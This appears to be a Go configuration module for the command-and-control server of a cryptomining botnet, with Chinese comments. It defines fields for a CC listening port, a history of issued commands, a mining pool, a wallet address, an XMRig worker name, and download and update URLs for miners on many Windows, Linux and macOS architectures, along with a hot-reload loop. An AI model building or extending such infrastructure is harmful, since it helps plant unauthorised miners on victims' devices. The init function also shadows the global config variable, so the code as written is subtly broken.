package utils

import (
	"encoding/json"
	"io/ioutil"
	"log"
	"os"
	"sync"
	"time"
)

/*
	存储一切全局参数
	实现了热加载
*/

type ConfigFile struct {
	fileName       string // 配置文件名
	lastModifyTime int64  // 上次修改时间
}

type Config struct {
	Lock              sync.Mutex  // 锁
	configFile        *ConfigFile // 配置对象
	Name              string      // 当前服务器名称
	CcServerPort      string      // 当前服务器主机监听端口号
	ServerVersion     string      // 当前服务端版本号
	MessageAesKey     string      // AES加密密钥,服务端客户端需要一致,服务端为了性能直接写死,客户端不写死,每次计算出来
	SessionTime       int64       // Session有效期,单位是天
	SessionGcTime     int         // session GC 的时间,默认是1天
	SessionCookieName string      // session对应的cookie名称,默认JSESSIONID
	WebServerPort     string      // web端 端口
	WebUserName       string      // web端认证账号
	WebUserPasswd     string      // web端认证密码
	MsgHistoryLen     int         // 历史CC消息数组长度，默认记录5条命令

	PoolUrl            string // 矿池地址
	WalletAddress      string // 钱包地址
	XmrigName          string // 矿工名称
	ClientVersion      string // 客户端版本号
	BaseStaticServerIp string // 静态资源服务器地址

	MiningWindows386     string // win32 矿工下载地址
	MiningWindowsAmd64   string // win64 矿工下载地址
	MiningWindowsDefault string // win32 矿工下载地址
	MiningLinux386       string // linux32 矿工下载地址
	MiningLinuxAmd64     string // linux64 矿工下载地址
	MiningLinuxArm       string // linuxArm 矿工下载地址
	MiningLinuxArm64     string // linuxArm64 矿工下载地址
	MiningLinuxMips      string
	MiningLinuxMipsle    string
	MiningLinuxMips64    string
	MiningLinuxMips64le  string
	MiningLinuxDefault   string // linux64 矿工下载地址
	MiningDarwinAmd64    string
	MiningDarwinArm64    string
	MiningDarwinDefault  string
	MiningDefault        string

	UpdateWindows386     string
	UpdateWindowsAmd64   string
	UpdateWindowsDefault string
	UpdateLinux386       string
	UpdateLinuxAmd64     string
	UpdateLinuxArm       string
	UpdateLinuxArm64     string
	UpdateLinuxMips      string
	UpdateLinuxMipsle    string
	UpdateLinuxMips64    string
	UpdateLinuxMips64le  string
	UpdateLinuxDefault   string
	UpdateDarwinAmd64    string
	UpdateDarwinArm64    string
	UpdateDarwinDefault  string
	UpdateDefault        string
}

/*
	定义一个全局的对象
*/

var GlobalConfig *Config

const ConfigFileName = "conf/conf.json"

func init() {
	//初始化GlobalObject变量，设置一些默认值
	GlobalConfig := &Config{
		//TcpServer:  nil,
		configFile: &ConfigFile{},
		Lock:       sync.Mutex{},
	}

	InitLog(1) // 初始化日志包
	GlobalConfig.Load()
	GlobalConfig.reLoad()
}

// Load 加载配置文件，应该在程序启动的时候执行此方法
func (c *Config) Load() {

	data, err := ioutil.ReadFile(ConfigFileName)
	if err != nil { // 如果配置文件加载失败，结束程序
		log.Println("加载 config.json 失败! 解释程序！")
		panic(err)
	}
	//将json数据解析到struct中
	c.Lock.Lock() // 修改GlobalConfig对象的时候加锁
	if err = json.Unmarshal(data, &GlobalConfig); err != nil {
		log.Println("加载 config.json 失败! 结束程序！")
		panic(err)
	}
	c.Lock.Unlock()

	log.Println("==> 加载配置文件 成功")
}

// reLoad 配置文件热加载,当配置文件发生改变后会重新加载配置,默认为5s的循环
func (c *Config) reLoad() {

	c.configFile.fileName = ConfigFileName
	file, err := os.Open(c.configFile.fileName)
	defer file.Close()
	if err != nil {
		log.Printf("打开配置文件出错")
		panic(err)
	}
	fileInfo, err := file.Stat()
	if err != nil {
		log.Printf("获取配置文件修改时间出错")
		panic(err)
	}
	configModifyTime := fileInfo.ModTime().Unix()

	c.Lock.Lock()
	c.configFile.lastModifyTime = configModifyTime // 初始化配置文件加载时间
	c.Lock.Unlock()

	//创建一个周期性的定时器
	ticker := time.NewTicker(10 * time.Second)
	go func() {
		for {
			<-ticker.C // 会每10秒从管道获取到一个时间值

			file, err := os.Open(c.configFile.fileName)
			if err != nil {
				log.Printf("打开配置文件出错")
				continue
			}
			fileInfo, err := file.Stat()
			if err != nil {
				log.Printf("获取配置文件修改时间出错")
				continue
			}
			configModifyTime := fileInfo.ModTime().Unix()
			//判断文件的修改时间是否大于最后一次修改时间
			if configModifyTime > c.configFile.lastModifyTime {
				GlobalConfig.Load() // 重新加载配置文件，不知道不加锁会不会出现同步读写的问题？？？
				c.Lock.Lock()
				c.configFile.lastModifyTime = configModifyTime // 将上次修改时间更改为现在的时间
				c.Lock.Unlock()
				log.Println("发现配置文件发生改变，已重新加载配资文件")
			} else {
				//log.Println("配置文件未发生改变")
			}
			err = file.Close()
			if err != nil {
				log.Println("文件关闭失败！开始重新读取配置文件", err)
			}
		}
	}()
	//select {}
}
